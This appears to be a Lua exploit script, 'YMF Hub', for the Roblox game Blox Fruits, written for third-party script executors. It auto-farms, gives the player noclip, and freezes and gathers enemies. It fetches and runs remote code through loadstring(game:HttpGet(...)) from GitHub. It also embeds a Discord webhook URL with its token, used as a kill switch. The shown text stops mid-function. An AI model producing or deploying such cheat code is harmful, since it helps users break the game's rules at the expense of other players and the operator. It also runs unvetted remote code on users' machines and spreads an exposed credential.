repeat
    task.wait()
until game:IsLoaded()
repeat
    task.wait()
until game.Players
repeat
    task.wait()
until game.Players.LocalPlayer
wait(10)
LoadedUiHub = false
local REQ = (syn and syn.request) or (identifyexecutor() == 'Fluxus' and request) or http_request or requests
local respspssp = REQ({
    Url = "https://discord.com/api/webhooks/1064190360881995796/qGOnFGbLlwNw8UlZFl64SoL_TV9Yggimknrse0SvkK5f2mjUV6x6XK5xfnmG8KN0RYy-",
})
if respspssp.StatusCode ~= 200 then
   return game:Shutdown()
end
function CheckTool(toolnam)
    lol = {
        game.Players.LocalPlayer.Character,
        game.Players.LocalPlayer.Backpack
    }
    for i, v in pairs(lol) do
        if v:FindFirstChild(toolnam) then
            return v:FindFirstChild(toolnam)
        end
    end
end
function CheckSea(Sea)
    if game.PlaceId == 2753915549 then
        if Sea == 1 then
            return true
        end
    elseif game.PlaceId == 4442272183 then
        if Sea == 2 then
            return true
        end
    elseif game.PlaceId == 7449423635 then
        if Sea == 3 then
            return true
        end
    end
    return false
end
lessfoundAnything = ""
function HopLow()
    if lessfoundAnything == "" then
        SiteHopServerLess =
            game.HttpService:JSONDecode(
            game:HttpGet(
                "https://games.roblox.com/v1/games/" ..
                    game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
            )
        )
    else
        SiteHopServerLess =
            game.HttpService:JSONDecode(
            game:HttpGet(
                "https://games.roblox.com/v1/games/" ..
                    game.PlaceId ..
                        "/servers/Public?sortOrder=Asc&limit=100&cursor=" ..
                            lessfoundAnything
            )
        )
    end
    if
        SiteHopServerLess.nextPageCursor and SiteHopServerLess.nextPageCursor ~= "null" and
            SiteHopServerLess.nextPageCursor ~= nil
     then
        lessfoundAnything = SiteHopServerLess.nextPageCursor
    end
    for i, v in pairs(SiteHopServerLess.data) do
        if v.playing and tonumber(v.playing) <= 4 and v.id ~= game.JobId then
            game:GetService("TeleportService"):TeleportToPlaceInstance(
                game.PlaceId,
                tostring(v.id),
                game.Players.LocalPlayer
            )
        end
    end
end
w = task.wait
t = task
local RAMAccount =
    loadstring(game:HttpGet "https://raw.githubusercontent.com/ic3w0lf22/Roblox-Account-Manager/master/RAMAccount.lua")(

)
TempleOfTimeCFrame =
    CFrame.new(
    28734.3945,
    14888.2324,
    -109.071777,
    -0.650207579,
    4.1780531e-08,
    -0.759756625,
    1.97876595e-08,
    1,
    3.80575109e-08,
    0.759756625,
    9.71147784e-09,
    -0.650207579
)
local Settings = {
    ["Attack No CD Aura"] = false,
    ["Ignore Y"] = false,
    ["Team"] = "Pirates",
    ["Tween Speed"] = 350,
    ["CDAAT"] = 80,
    ["TimeWait"] = 10,
    ["ChoosenRaid"] = "Flame"
}
if _G.TaoCuttay then Settings["CuttayV4"] = true end
HttpService = game:GetService("HttpService")
local FolderName = "YMF Hub"
local SaveFileNameGame = "-BloxFruit.json"
local SaveFileName = game.Players.LocalPlayer.Name .. SaveFileNameGame
if Adel then 
    HttpService = game:GetService("HttpService")
    local FolderName = "YMF Hub"
    local SaveFileNameGame = "-BloxFruit.json"
    local SaveFileName = game.Players.LocalPlayer.Name .. SaveFileNameGame
end

function SaveSettings(fff, fff2)
    if fff ~= nil then
        Settings[fff] = fff2
    end
    HttpService = game:GetService("HttpService")
    if not isfolder(FolderName) then
        makefolder(FolderName)
    end
    writefile(FolderName .. "/" .. SaveFileName, HttpService:JSONEncode(Settings))
end

function ReadSetting()
    local s, e =
        pcall(
        function()
            HttpService = game:GetService("HttpService")
            if not isfolder(FolderName) then
                makefolder(FolderName)
            end
            return HttpService:JSONDecode(readfile(FolderName .. "/" .. SaveFileName))
        end
    )
    if s then
        return e
    else
        SaveSettings()
        return ReadSetting()
    end
end
function GetDistance(instance)
    if type(instance) == "instance" then 
        if Instance:IsA("BasePart") or Instance:IsA("Part") then 
            return (instance.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        elseif Instance:FindFirstChild("HumanoidRootPart") then 
            return (instance.HumanoidRootPart.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
        else
            for i,v in pairs(instance:GetDescendants()) do 
                if v:IsA("BasePart") or v:IsA("Part") then 
                    return (v.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                end
            end
        end
    else
        return (instance-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
    end
end
Settings = ReadSetting()
hasv3 = false
CakePrinceFarmCFrame = CFrame.new(-2142.66821, 71.2588654, -12327.4619, 0.996939838, -4.33107843e-08, 0.078172572, 4.20252917e-08, 1, 1.80894251e-08, -0.078172572, -1.47488439e-08, 0.996939838)
BoneFarmCFrame = CFrame.new(-9505.55371, 172.448059, 6086.27588, 0.927873373, -2.18353513e-09, -0.37289542, -4.01526146e-09, 1, -1.58467728e-08, 0.37289542, 1.62010725e-08, 0.927873373)
function CheckAnyPlayerDistnaceInCFrame(gh,distn)
    for i,v in pairs(game.Players:GetChildren()) do 
        pcall(function()
            if v.Name ~= game.Players.LocalPlayer.Name and (v.Character.HumanoidRootPart.Position-gh.Position).Magnitude <= distn then 
                return v 
            end
        end)
    end
end
spawn(function()
    while task.wait() do
        if Settings["CuttayV4"] then 
            if not LoadedUiHub then repeat task.wait() until LoadedUiHub end 
            V4Status = CheckAcientOneStatus()
            v14 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TempleClock", "Check")
            if not hasv3 then hasv3 = string.find(CheckRace(),"V3") or string.find(CheckRace(),"V4") end
            Settings["Tween Speed"] = 300
            if LocalPlayerLevelValue < 2450 then 
                tablestatssave["Melee"] = true 
                tablestatssave["Defense"] = false
                FastAttackSetting2:Set(100)
                FastAttackSetting1:Set(15.5)
                pcall(function() AutoStats_Toggle:Set(true) end)
                Settings["Auto Stats"] = true
                Settings["Melee Choosen"]["Superhuman"] = true
                if AutoMelee_Toggle then AutoMelee_Toggle:Set(true) end 
                MethodFarm_Dropdown:Set("Level")
                SelectWeaponType_Dropdown:Set("Melee")
                Farm_Toggle:Set(true)
                DoubleQuest_Toggle:Set(true)
                if AutoSea2_Toggle then AutoSea2_Toggle:Set(true) end
                if AutoSaber_Toggle then AutoSaber_Toggle:Set(true) end
                if AutoPoleV1_Toggle then AutoPoleV1_Toggle:Set(true) end
                if AutoEilite_Toggle then AutoEilite_Toggle:Set(true) end 
                if AutoRipIndra_Toggle then AutoRipIndra_Toggle:Set(true) end 
                if AutoPirateRaid_Toggle then AutoPirateRaid_Toggle:Set(true) end
                if AutoTushitaToggle then AutoTushitaToggle:Set(true) end
                Settings["Auto Saber"] = true 
                Settings["Auto Pole V1"] = true 
                Settings["Auto Sea 2"] = true
                AutoActiveRace_Toggle:Set(true)
                if AutoRaid_Toggle then AutoRaid_Toggle:Set(true) end
                _G.TaoCanDiTrial = false
                _G.HopNear = true
            elseif not hasv3 then
                TeleportSea(2)
                AutoUpgradeRace_Toggle:Set(true)
                Farm_Toggle:Set(false)
                if AutoRaid_Toggle then AutoRaid_Toggle:Set(false) end
            elseif v14 and v14.HadPoint then 
                TeleportSea(3)
                MethodFarm_Dropdown:Set("Cake Prince")
                SelectWeaponType_Dropdown:Set("Melee")
                Farm_Toggle:Set(false)
                AutoBuyGear_Toggle:Set(true)
                if AutoRaid_Toggle then AutoRaid_Toggle:Set(false) end
                AutoChooseGear_Toggle:Set(true)
                _G.TaoCanDiTrial = false
            elseif string.find(V4Status,"Trial") or (string.find(V4Status,"greatness") and game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") ) then 
                TeleportSea(3)
                MethodFarm_Dropdown:Set("Cake Prince")
                SelectWeaponType_Dropdown:Set("Melee")
                Farm_Toggle:Set(false)
                AutoBuyGear_Toggle:Set(true)
                if AutoRaid_Toggle then AutoRaid_Toggle:Set(false) end
                AutoChooseGear_Toggle:Set(true)
                EnableAllTrial_Toggle:Set(true)
                _G.TaoCanDiTrial = true 
                _G.HopNear = false
            elseif string.find(V4Status,"Train") or string.find(V4Status,"Trains") or string.find(V4Status,"sessions") then 
                TeleportSea(3)
                if CheckAnyPlayerDistnaceInCFrame(CakePrinceFarmCFrame,1500) then 
                    MethodFarm_Dropdown:Set("Bone")
                else
                    MethodFarm_Dropdown:Set("Cake Prince")
                end
                SelectWeaponType_Dropdown:Set("Melee")
                Farm_Toggle:Set(true)
                AutoActiveRace_Toggle:Set(true)
                AutoBuyGear_Toggle:Set(true)
                if AutoRaid_Toggle then AutoRaid_Toggle:Set(false) end
                AutoChooseGear_Toggle:Set(false)
                _G.TaoCanDiTrial = false
                _G.HopNear = true
            end
        end
    end
end)
repeat
    pcall(
        function()
            task.wait()
            if game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main"):FindFirstChild("ChooseTeam") then
                if string.find(tostring(Settings["Team"]), "Pirate") then
                    for i, v in pairs(
                        getconnections(
                            game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated
                        )
                    ) do
                        v.Function()
                    end
                elseif string.find(tostring(Settings["Team"]), "Marine") then
                    for i, v in pairs(
                        getconnections(
                            game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.ViewportFrame.TextButton.Activated
                        )
                    ) do
                        v.Function()
                    end
                else
                    for i, v in pairs(
                        getconnections(
                            game:GetService("Players").LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.ViewportFrame.TextButton.Activated
                        )
                    ) do
                        v.Function()
                    end
                end
            end
        end
    )
until game.Players.LocalPlayer.Team ~= nil
w(1)
local placeId = game.PlaceId
if placeId == 2753915549 then
    Sea1 = true
elseif placeId == 4442272183 then
    Sea2 = true
elseif placeId == 7449423635 then
    Sea3 = true
end
local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/memaybeohub/Function-Scripts/main/OrionLib.lua")))()
function MoonTextureId()
    if Sea1 then
        return game:GetService("Lighting").FantasySky.MoonTextureId
    elseif Sea2 then
        return game:GetService("Lighting").FantasySky.MoonTextureId
    elseif Sea3 then
        return game:GetService("Lighting").Sky.MoonTextureId
    end
end
concacsss = (Adel and "Adel") or "YMF"
local Window = OrionLib:MakeWindow({Name = "Blox Fruit (YMF Hub)",IntroEnabled =false,IntroText ='YMF Hub Library',IntroIcon = 'rbxassetid://13779309461' , HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})
local MainTab =
    Window:MakeTab( 
    {
        Name = "Main",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    }
)
local ServerTab =
    Window:MakeTab(
    {
        Name = "Server ",
        Icon = MoonTextureId(),
        PremiumOnly = false
    }
)
local FarmTab =
    Window:MakeTab(
    {
        Name = "Extra Farm",
        Icon = MoonTextureId(),
        PremiumOnly = false
    }
)
local Swords_MeleeTab =
    Window:MakeTab(
    {
        Name = "Sword & Melee",
        Icon = MoonTextureId(),
        PremiumOnly = false
    }
)
local TrialTab =
    Window:MakeTab(
    {
        Name = "Trial",
        Icon = MoonTextureId(),
        PremiumOnly = false
    }
)

function Notify(T1, T2, T3)
    if T1 == nil or T1 == "" then
        T1 = "Not Titled"
    end
    if T2 == nil or T2 == "" then
        T2 = "No Any Descriptions"
    end
    if type(T3) ~= "number" then
        T3 = 10
    end
    OrionLib:MakeNotification(
        {
            Name = T1,
            Content = T2,
            Image = MoonTextureId(),
            Time = T3
        }
    )
end
local MobsList = {}
Mob = ""
Mob1 = ""
plr = game.Players.LocalPlayer
local CreateFoldermmb = Instance.new("Folder")
CreateFoldermmb.Parent = game.Workspace
CreateFoldermmb.Name = "MobSpawns"
repeat
    wait()
until game.Workspace:FindFirstChild("MobSpawns")
function MobDepTrai()
    MobDepTraiTable = {}
    for i, v in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
        table.insert(MobDepTraiTable,v)
    end
    local tablefoldermmb = {}
    for i, v in next, require(game:GetService("ReplicatedStorage").Quests) do
        for i1, v1 in next, v do
            for i2, v2 in next, v1.Task do
                if v2 > 1 then
                    table.insert(tablefoldermmb, i2)
                end
            end
        end
    end
    if string.find(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()[1].Name, "Lv.") then
        for i, v in pairs(getnilinstances()) do
            if table.find(tablefoldermmb, tostring(v.Name:gsub(" %pLv. %d+%p", ""))) then
                table.insert(MobDepTraiTable,v)
            end
        end
    else
        for i, v in pairs(getnilinstances()) do
            if table.find(tablefoldermmb, v.Name) then
                table.insert(MobDepTraiTable,v)
            end
        end
    end
    return MobDepTraiTable
end
MobS = MobDepTrai()
function FunctionFoldermob()
    print("FunctionFoldermob")
    repeat wait();if game.Workspace:FindFirstChild("MobSpawns") then game.Workspace.MobSpawns:Destroy() end; until not game.Workspace:FindFirstChild("MobSpawns")
    local CreateFoldermmb = Instance.new("Folder")
    CreateFoldermmb.Parent = game.Workspace
    CreateFoldermmb.Name = "MobSpawns"
    wait()
    repeat wait() until game.Workspace:FindFirstChild("MobSpawns")
    for i,v in pairs(MobS) do 
        if v then 
            if v:FindFirstChild("HumanoidRootPart") then 
                MobNew = v.HumanoidRootPart.CFrame
                MobNew.Name = v.Name 
                MobNew.Parent = game.Workspace.MobSpawns
            else
                MobNew = v:Clone()
                MobNew.Parent = game.Workspace.MobSpawns
            end
        end
    end
end
FunctionFoldermob()
heypro = {}
function GetMobSpawn(a)
    if not heypro[a] then 
        if not game.Workspace.MobSpawns:FindFirstChild(a) then 
            FunctionFoldermob()
        end
        wait()
        for i, v in next, game.Workspace.MobSpawns:GetChildren() do
            if v.Name == a then
                heypro[a] = v
            end 
        end
    else
        return heypro[a]
    end
end
function GetMobSpawnList(a)
    k = {}
    for i, v in next, game.Workspace.MobSpawns:GetChildren() do
        if v.Name == a then
            table.insert(k, v)
        end
    end
    return k
end
local Quest = require(game.ReplicatedStorage.Quests)
local UselessQuest = {
    "BartiloQuest",
    "Trainees",
    "MarineQuest",
    "CitizenQuest"
}
local function CheckQuest()
    local lvlPl = LocalPlayerLevelValue
    local min = 0
    if lvlPl >= 1450 and game.PlaceId == 4442272183 then
        Mob1 = "Water Fighter"
        Mob2 = "ForgottenQuest"
        Mob3 = 2
    elseif lvlPl >= 700 and game.PlaceId == 2753915549 then
        Mob1 = "Galley Captain"
        Mob2 = "FountainQuest"
        Mob3 = 2
    elseif
        lvlPl >= 2075 and autofullymelee and
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyDragonTalon", true) ~= 1 and
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", true) == 1
     then
        Mob1 = "Posessed Mummy"
        Mob2 = "HauntedQuest2"
        Mob3 = 2
    else
        for i, v in pairs(Quest) do
            for i1, v1 in pairs(v) do
                local lvlreq = v1.LevelReq
                for i2, v2 in pairs(v1.Task) do
                    if
                        lvlPl >= lvlreq and lvlreq >= min and v1.Task[i2] > 1 and
                            not table.find(UselessQuest, tostring(i))
                     then
                        min = lvlreq
                        Mob1 = tostring(i2)
                        Mob2 = i
                        Mob3 = i1
                    end
                end
            end
        end
    end
end
function CFrameQuest()
    QuestPoses = {}
    for i, v in pairs(getnilinstances()) do
        if
            v:IsA("Model") and v:FindFirstChild("Head") and v.Head:FindFirstChild("QuestBBG") and
                v.Head.QuestBBG.Title.Text == "QUEST"
         then
            QuestPoses[v.Name] = v.Head.CFrame * CFrame.new(0, -2, 2)
        end
    end

    for i, v in pairs(game.Workspace.NPCs:GetDescendants()) do
        if v.Name == "QuestBBG" and v.Title.Text == "QUEST" then
            QuestPoses[v.Parent.Parent.Name] = v.Parent.Parent.Head.CFrame * CFrame.new(0, -2, 2)
        end
    end

    DialoguesList = {}
    for i, v in pairs(require(game.ReplicatedStorage.DialoguesList)) do
        DialoguesList[v] = i
    end

    local kiet = getscriptclosure(game:GetService("Players").LocalPlayer.PlayerScripts.NPC)

    local listremote = {}
    for k, v in pairs(debug.getprotos(kiet)) do
        if #debug.getconstants(v) == 1 then
            table.insert(listremote, debug.getconstant(v, 1))
        end
    end
    local start = false
    local listtvk = {}
    for k, v in pairs(debug.getconstants(kiet)) do
        if type(v) == "string" then
            if v == "Players" then
                start = false
            end
            if not start then
                if v == "Blox Fruit Dealer" then
                    start = true
                end
            else
            end
            if start then
                table.insert(listtvk, v)
            end
        end
    end
    local QuestPoint1 = {}
    QuestPoint = {}

    for k, v in pairs(listtvk) do
        if QuestPoses[v] then
            QuestPoint1[listremote[k]] = listtvk[k]
        end
    end

    for i, v in next, QuestPoint1 do
        QuestPoint[i] = QuestPoses[v]
    end
    QuestPoint["SkyExp1Quest"] =
        CFrame.new(
        -7857.28516,
        5544.34033,
        -382.321503,
        -0.422592998,
        0,
        0.906319618,
        0,
        1,
        0,
        -0.906319618,
        0,
        -0.422592998
    )
end
function CheckDoubleQuest()
    local a = {}
    for i, v in pairs(Quest) do
        for i1, v1 in pairs(v) do
            local lvlreq = v1.LevelReq
            for i2, v2 in pairs(v1.Task) do
                if i2 == Mob1 then
                    for i3, v3 in next, v do
                        if v3.LevelReq <= game.Players.LocalPlayer.Data.Level.Value and v3.Name ~= "Town Raid" then
                            for i4, v4 in next, v3.Task do
                                if v4 > 1 then
                                    table.insert(a, i4)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    return a
end
local v17 = require(game.ReplicatedStorage:WaitForChild("GuideModule"))
function CheckQuestData()
    for i, v in next, v17.Data do
        if i == "QuestData" then
            return true
        end
    end
    return false
end
function CheckNameDoubleQuest()
    local a
    if CheckQuestData() then
        for i, v in next, v17.Data.QuestData.Task do
            a = i
        end
    end
    return a
end
function CheckNameDoubleQuest2()
    local a
    local a2 = {}
    if CheckQuestData() then
        for i, v in next, v17.Data.QuestData.Task do
            a = i
            table.insert(a2, i)
        end
    end
    return a2
end
function CheckDoubleQuest2()
    CheckQuest()
    local aa = {}
    if
        game.Players.LocalPlayer.Data.Level.Value >= 10 and Settings["Double Quest"] and CheckQuestData() and
            CheckNameDoubleQuest() == Mob1 and
            #CheckNameDoubleQuest() > 2
     then
        for i, v in pairs(Quest) do
            for i1, v1 in pairs(v) do
                for i2, v2 in pairs(v1.Task) do
                    if tostring(i2) == Mob1 then
                        for quest1, quest2 in next, v do
                            for quest3, quest4 in next, quest2.Task do
                                if quest3 ~= Mob1 and quest4 > 1 then
                                    if quest2.LevelReq <= game.Players.LocalPlayer.Data.Level.Value then
                                        aa["Name"] = tostring(quest3)
                                        aa["NameQuest"] = i
                                        aa["ID"] = quest1
                                    else
                                        aa["Name"] = Mob1
                                        aa["NameQuest"] = Mob2
                                        aa["ID"] = Mob3
                                    end
                                    return aa
                                end
                            end
                        end
                    end
                end
            end
        end
    else
        aa["Name"] = Mob1
        aa["NameQuest"] = Mob2
        aa["ID"] = Mob3
        return aa
    end
    aa["Name"] = Mob1
    aa["NameQuest"] = Mob2
    aa["ID"] = Mob3
    return aa
end
function MobLevel1OrMobLevel2()
    local mbb = {}
    for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if
            not table.find(mbb, v.Name) and v:IsA("Model") and v.Name ~= "PirateBasic" and
                not string.find(v.Name, "Brigade") and
                v:FindFirstChild("Humanoid") and
                v.Humanoid.Health > 0 and
                v:FindFirstChild("HumanoidRootPart")
         then
            table.insert(mbb, v.Name)
        end
    end
    for i, v in pairs(mbb) do
        local b = v
        v = tostring(v:gsub(" %pLv. %d+%p", ""))
        if tostring(v) == CheckNameDoubleQuest() then
            return tostring(b)
        end
    end
    return false
end
local CommF = game.ReplicatedStorage.Remotes["CommF_"]
CFrameQuest()
function GetQuest()
    if game.Players.LocalPlayer.PlayerGui.Main:FindFirstChild("Quest").Visible then
        return
    end
    if not QuestPoint[tostring(CheckDoubleQuest2().NameQuest)] then
        CFrameQuest()
        return
    end
    if
        (QuestPoint[CheckDoubleQuest2().NameQuest].Position -
            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 8
     then
        CommF:InvokeServer("StartQuest", tostring(CheckDoubleQuest2().NameQuest), CheckDoubleQuest2().ID)
    else
        QuestCFrame = QuestPoint[CheckDoubleQuest2().NameQuest]
        Tweento(QuestCFrame)
    end
end
function GetMob()
    local tablegetmob = {}
    for i, v in pairs(game.Workspace.MobSpawns:GetChildren()) do
        if not table.find(tablegetmob, v.Name) then
            table.insert(tablegetmob, v.Name)
        end
    end
    if string.find(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()[1].Name, "Lv.") then
        for i, v in pairs(tablegetmob) do
            local b = v
            v = tostring(v:gsub(" %pLv. %d+%p", ""))
            if v == CheckNameDoubleQuest() then
                return b
            end
        end
    else
        return CheckNameDoubleQuest()
    end
end
local MBLVSKIP = {"Royal Squad [Lv. 525]", "Shanda [Lv. 475]"}
function MobLevelSkip()
    for i, v in next, game.workspace.Enemies:GetChildren() do
        if
            v:IsA("Model") and table.find(MBLVSKIP, v.Name) and v:FindFirstChild("HumanoidRootPart") and
                v.Humanoid.Health > 0
         then
            return v.Name
        end
    end
end

spawn(
    function()
        game:GetService("RunService").Stepped:Connect(
            function()
                if NoClip then
                    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
                    if not game.Players.LocalPlayer.Character.Head:FindFirstChild("BodyVelocity") then
                        local bv = Instance.new("BodyVelocity")
                        bv.Velocity = Vector3.new(0,0,0)
                        bv.MaxForce = Vector3.new(math.huge,math.huge,math.huge)--Play around with this
                        bv.P = 9000--Play around with this
                        bv.Parent = game.Players.LocalPlayer.Character.Head
                        for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                            if v:IsA("BasePart") then
                                v.CanCollide = false
                            end
                        end
                    end
                elseif not NoClip and game.Players.LocalPlayer.Character.Head:FindFirstChild("BodyVelocity") then 
                    game.Players.LocalPlayer.Character.Head:FindFirstChild("BodyVelocity"):Destroy()
                elseif not NoClip then 
                    if not aksaksaks or tick()-aksaksaks >= 3 then
                        game.Players.LocalPlayer.Character.Humanoid:ChangeState()
                        aksaksaks = tick()
                    end
                end
                --[[
                if not donotdixuyentuong then
                    if asasas then
                        setfflag("HumanoidParallelRemoveNoPhysics", "False")
                        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
                        if
                            game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and
                                game.Players.LocalPlayer.Character.Humanoid.Sit
                         then
                            game.Players.LocalPlayer.Character.Humanoid.Sit = false
                        end
                        if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
                            setfflag("HumanoidParallelRemoveNoPhysics", "False")
                            setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
                            game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
                        end
                    end
                end
                ]]
            end
        )
    end
)
spawn(function()
    while task.wait() do 
        if tween and tween.PlaybackState == Enum.PlaybackState.Playing then 
            NoClip = true 
        elseif tween then 
            ticktween = tick()
            repeat task.wait();if tween and tween.PlaybackState == Enum.PlaybackState.Playing then NoClip = true end; until tick()-ticktween >= 3 and (not tween or tween.PlaybackState ~= Enum.PlaybackState.Playing)
            NoClip = false
        end
    end
end)
function CheckItem(itemcc)
    for k, v in pairs(game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")) do
        if v.Name == itemcc then
            return v
        end
    end
end
local SmartBring = {
    ["Bandit [Lv. 5]"] = true,
    ["Monkey [Lv. 14]"] = true,
    ["Gorilla [Lv. 20]"] = true,
    ["Pirate [Lv. 35]"] = true,
    ["Desert Bandit [Lv. 60]"] = true,
    ["Desert Officer [Lv. 70]"] = true,
    ["Snow Bandit [Lv. 90]"] = true,
    ["Snowman [Lv. 100]"] = true,
    ["Chief Petty Officer [Lv. 120]"] = false,
    ["Sky Bandit [Lv. 150]"] = true,
    ["Dark Master [Lv. 175]"] = true,
    ["Prisoner [Lv. 190]"] = false,
    ["Dangerous Prisoner [Lv. 210]"] = false,
    ["Toga Warrior [Lv. 250]"] = true,
    ["Military Soldier [Lv. 300]"] = true,
    ["Military Spy [Lv. 325"] = true,
    ["Fishman Warrior [Lv. 375]"] = true,
    ["Fishman Commando [Lv. 400]"] = true,
    ["God's Guard [Lv. 450]"] = true,
    ["Shanda [Lv. 475]"] = true,
    ["Royal Squad [Lv. 525]"] = true,
    ["Royal Soldier [Lv. 550]"] = true,
    ["Galley Pirate [Lv. 625]"] = true,
    ["Galley Captain [Lv. 650]"] = true,
    ["Raider [Lv. 700]"] = false,
    ["Mercenary [Lv. 725]"] = false,
    ["Swan Pirate [Lv. 775]"] = true,
    ["Factory Staff [Lv. 800]"] = false,
    ["Marine Lieutenant [Lv. 875]"] = true,
    ["Marine Captain [Lv. 900]"] = true,
    ["Zombie [Lv. 950]"] = true,
    ["Vampire [Lv. 975]"] = true,
    ["Snow Trooper [Lv. 1000]"] = false,
    ["Winter Warrior [Lv. 1050]"] = true,
    ["Lab Subordinate [Lv. 1100]"] = true,
    ["Horned Warrior [Lv. 1125]"] = true,
    ["Magma Ninja [Lv. 1175]"] = false,
    ["Lava Pirate [Lv. 1200]"] = true,
    ["Ship Deckhand [Lv. 1250]"] = false,
    ["Ship Engineer [Lv. 1275]"] = false,
    ["Ship Steward [Lv. 1300]"] = true,
    ["Ship Officer [Lv. 1325]"] = false,
    ["Arctic Warrior [Lv. 1350]"] = true,
    ["Snow Lurker [Lv. 1375]"] = true,
    ["Sea Soldier [Lv. 1425]"] = false,
    ["Water Fighter [Lv. 1450]"] = true,
    ["Pirate Millionaire [Lv. 1500]"] = false,
    ["Pistol Billionaire [Lv. 1525]"] = false,
    ["Dragon Crew Warrior [Lv. 1575]"] = false,
    ["Dragon Crew Archer [Lv. 1600]"] = false,
    ["Female Islander [Lv. 1625]"] = false,
    ["Giant Islander [Lv. 1650]"] = false,
    ["Marine Commodore [Lv. 1700]"] = false,
    ["Marine Rear Admiral [Lv. 1725]"] = true,
    ["Fishman Raider [Lv. 1775]"] = true,
    ["Fishman Captain [Lv. 1800]"] = false,
    ["Forest Pirate [Lv. 1825]"] = true,
    ["Mythological Pirate [Lv. 1850]"] = false,
    ["Jungle Pirate [Lv. 1900]"] = false,
    ["Musketeer Pirate [Lv. 1925]"] = true,
    ["Reborn Skeleton [Lv. 1975]"] = true,
    ["Living Zombie [Lv. 2000]"] = true,
    ["Demonic Soul [Lv. 2025]"] = true,
    ["Posessed Mummy [Lv. 2050]"] = true,
    ["Peanut Scout [Lv. 2075]"] = true,
    ["Peanut President [Lv. 2100]"] = true,
    ["Ice Cream Chef [Lv. 2125]"] = true,
    ["Ice Cream Commander [Lv. 2150]"] = true,
    ["Cookie Crafter [Lv. 2200]"] = true,
    ["Cake Guard [Lv. 2225]"] = true,
    ["Baking Staff [Lv. 2250]"] = true,
    ["Head Baker [Lv. 2275]"] = true,
    ["Cocoa Warrior [Lv. 2300]"] = true,
    ["Chocolate Bar Battler [Lv. 2325]"] = true,
    ["Sweet Thief [Lv. 2350]"] = true,
    ["Candy Rebel [Lv. 2375]"] = true,
    ["Snow Demon [Lv. 2425]"] = true,
    ["Candy Pirate [Lv. 2400]"] = true
}
function CancelTween()
    return Tweento(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end
function function0(a)
    if a:FindFirstChild("Humanoid") and a:FindFirstChild("HumanoidRootPart") and CheckExploitNgu(a.HumanoidRootPart) then
        return true
    else
        return false
    end
end
function function01(tb)
    tb2 = 0
    for i, v in pairs(tb) do
        if v > tb2 then
            tb2 = v
        end
    end
    return tb2
end
function function1()
    local s = {}
    local s3 = false
    for _, t1 in pairs(game.workspace.Enemies:GetChildren()) do
        if function0(t1) then
            for _, t2 in pairs(game.workspace.Enemies:GetChildren()) do
                if function0(t2) and function0(t1) then
                    if (t2.HumanoidRootPart.Position - t1.HumanoidRootPart.Position).Magnitude < 350 then
                        if not s[t1.HumanoidRootPart.CFrame] then
                            s[t1.HumanoidRootPart.CFrame] = 1
                        else
                            s[t1.HumanoidRootPart.CFrame] = s[t1.HumanoidRootPart.CFrame] + 1
                        end
                    end
                end
            end
        end
    end
    local s2 = function01(s)
    for i, v in pairs(s) do
        if v == s2 then
            s3 = i
        end
    end
    return s3
end
function BringMobSkidCuaSeaHub()
    local c = function1()
    local c2 = game.workspace.Enemies:GetChildren()
    if #c2 > 1 then
        for c4 = 1, #c2 do
            for k, v in pairs(game.workspace.Enemies:GetChildren()) do
                if function0(v) and (v.HumanoidRootPart.Position - c.Position).Magnitude < 350 then
                    v.HumanoidRootPart.CFrame = c
                    v.Humanoid:ChangeState(11)
                    v.HumanoidRootPart.CanCollide = false
                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1)
                    v.HumanoidRootPart.Transparency = 1
                    for _, f in pairs(v:GetChildren()) do
                        if v:IsA("BasePart") then
                            v.Velocity = Vector3.new(0, 0, 0)
                            v.CanCollide = 0
                            v.Anchored = true
                        end
                    end
                    if v:FindFirstChild("Humanoid") then
                        v.Humanoid.WalkSpeed = 0
                        v.Humanoid.JumpPower = 0
                    else
                        return
                    end
                    if v.Humanoid:FindFirstChild("Animator") then
                        v.Humanoid.Animator:Destroy()
                    end
                    v.Humanoid:ChangeState(11)
                end
            end
        end
    end
end
function GetNpcPos(name)
    local tong
    local c = 0
    for k, v in pairs(game.Workspace.Enemies:GetChildren()) do
        if v.Name == name then
            if not tong then
                tong = v.HumanoidRootPart.Position
            else
                tong = tong + v.HumanoidRootPart.Position
            end
            c = c + 1
        end
    end
    tong = tong / c
    return tong
end
function GetNearestPlayer(pos)
    ner = math.huge
    for i, v in pairs(game.Players:GetChildren()) do
        if (v.Character.HumanoidRootPart.Position - pos).Magnitude < ner then
            ner = (v.Character.HumanoidRootPart.Position - pos).Magnitude
        end
    end
    for i, v in pairs(game.Players:GetChildren()) do
